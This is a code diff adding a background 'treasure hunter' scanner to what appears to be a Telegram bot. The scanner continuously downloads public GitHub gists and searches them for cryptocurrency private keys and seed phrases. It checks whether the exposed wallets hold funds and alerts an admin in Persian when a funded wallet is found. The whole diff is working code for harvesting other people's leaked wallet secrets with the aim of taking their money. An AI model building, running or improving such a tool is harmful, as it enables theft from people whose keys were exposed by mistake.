@@ -226,6 +226,91 @@ BIP39_WORDS = {
 "year","yellow","you","young","youth","zebra","zero","zone","zoo"
 }
 
+import asyncio
+import atexit
+import threading
+
+# Global auto scanner state
+auto_scan_running = False
+auto_scan_thread = None
+
+# ---------------------- Auto public scanner ----------------------
+def fetch_recent_pastes():
+    """Fetch recent public pastes from pastebin-like sources"""
+    results = []
+    # Recent github gists (public)
+    try:
+        r = requests.get("https://api.github.com/gists/public?per_page=30", timeout=10, headers={"Accept":"application/vnd.github.v3+json"})
+        if r.ok:
+            for gist in r.json():
+                for fn, finfo in gist.get("files", {}).items():
+                    raw = finfo.get("raw_url")
+                    if raw:
+                        try:
+                            txt = requests.get(raw, timeout=8).text
+                            results.append((txt, f"github_gist:{gist.get('id')}"))
+                        except:
+                            pass
+    except Exception as e:
+        print(f"github scan err: {e}", flush=True)
+    return results
+
+async def auto_scanner_loop(bot_app, admin_id):
+    """Background task 24/7 to scan public sources"""
+    global auto_scan_running
+    auto_scan_running = True
+    state = load_hunter_state()
+    state["running"] = True
+    state["started_at"] = int(time.time())
+    save_hunter_state(state)
+    print("🕵️ Auto treasure scanner started 24/7", flush=True)
+    try:
+        await bot_app.send_message(admin_id, "✅ اسکنر خودکار شکارچی روشن شد!\n۲۴ ساعته در منابع عمومی در حال گشتن هستم، هر چیزی باارزش پیدا کنم فورا بهت میگم.")
+    except:
+        pass
+    while auto_scan_running:
+        try:
+            state = load_hunter_state()
+            state["checked"] += 1
+            save_hunter_state(state)
+            sources = fetch_recent_pastes()
+            existing = load_found()
+            seen_keys = set((f["type"], f["value"]) for f in existing)
+            new_count = 0
+            for text, src in sources:
+                findings = scan_text(text, source=src)
+                if findings:
+                    findings = check_balance_of_findings(findings)
+                    for f in findings:
+                        k = (f["type"], f["value"])
+                        if k not in seen_keys:
+                            existing.append(f)
+                            seen_keys.add(k)
+                            new_count += 1
+                            bal = f.get("balance",0) or 0
+                            msg = f"🕵️ <b>مورد جدید پیدا شد!</b>\nمنبع: {src}\nنوع: {f['type']}\nمقدار:\n<code>{f['value'][:500]}</code>"
+                            if bal > 0.0001:
+                                msg += f"\n\n💰 موجودی: {bal:.8f} {f.get('coin','')}"
+                                msg += "\n🚨 این کیف پول موجود دارد!"
+                            try:
+                                await bot_app.send_message(admin_id, msg)
+                            except:
+                                pass
+            if new_count > 0:
+                save_found(existing)
+            # Wait 2-5 min between scans (polite to APIs)
+            wait = random.randint(120, 300)
+            await asyncio.sleep(wait)
+        except Exception as e:
+            print(f"Auto scan error: {e}", flush=True)
+            await asyncio.sleep(60)
+
+def start_auto_scanner(app, admin_id):
+    """Start the auto scanner in background"""
+    global auto_scan_thread
+    if not auto_scan_running:
+        asyncio.create_task(auto_scanner_loop(app, admin_id))
+
 # ---------------------- Regex patterns ----------------------
 RE_BTC_WIF = re.compile(r'(?<![a-zA-Z0-9])[5KL][1-9A-HJ-NP-Za-km-z]{50,51}(?![a-zA-Z0-9])')
 RE_TRON_ADDR = re.compile(r'(?<![a-zA-Z0-9])T[1-9A-HJ-NP-Za-km-z]{33}(?![a-zA-Z0-9])')
